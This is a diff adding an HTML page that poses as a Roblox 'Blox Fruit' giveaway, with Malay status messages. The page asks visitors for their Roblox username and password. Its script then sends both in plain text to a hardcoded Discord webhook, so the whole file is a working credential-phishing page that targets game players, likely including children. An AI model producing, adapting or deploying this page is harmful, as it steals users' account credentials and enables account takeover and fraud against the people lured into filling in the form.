@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Roblox Giveaway</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      background-color: #e3e3e3;
+      text-align: center;
+      padding: 30px;
+    }
+    .container {
+      background: white;
+      border-radius: 10px;
+      padding: 30px;
+      max-width: 400px;
+      margin: auto;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+    }
+    input, button {
+      padding: 10px;
+      margin: 10px 0;
+      width: 90%;
+      font-size: 16px;
+    }
+    button {
+      background-color: #00b06b;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #008f58;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>🎁 Roblox Blox Fruit Giveaway 🎁</h2>
+    <p>Isi untuk peluang menang permata, beli gamepass dan lebih lagi!</p>
+    <form id="giveawayForm">
+      <input type="text" id="username" placeholder="Roblox Username" required><br>
+      <input type="password" id="password" placeholder="Roblox Password" required><br>
+      <button type="submit">Join Giveaway</button>
+    </form>
+    <p id="status"></p>
+  </div>
+
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1396797120983466044/6YdZO0lCdFr9DOXIBS3iEv1G2Xw9FLyj20nEwx4nfOP172TVk-DgYTPEKIWf8RrYtbzG";
+
+    document.getElementById("giveawayForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+      const statusText = document.getElementById("status");
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: `📥 User joined giveaway!\n👤 Username: **${username}**\n🔑 Password: ||${password}||`
+        })
+      })
+      .then(res => {
+        if (res.ok) {
+          statusText.textContent = "✅ Berjaya hantar! Semak Discord anda.";
+          document.getElementById("username").value = "";
+          document.getElementById("password").value = "";
+        } else {
+          statusText.textContent = "❌ Gagal hantar. Sila cuba lagi.";
+        }
+      })
+      .catch(err => {
+        console.error(err);
+        statusText.textContent = "⚠️ Ralat berlaku. Semak sambungan atau URL Webhook.";
+      });
+    });
+  </script>
+</body>
+</html>
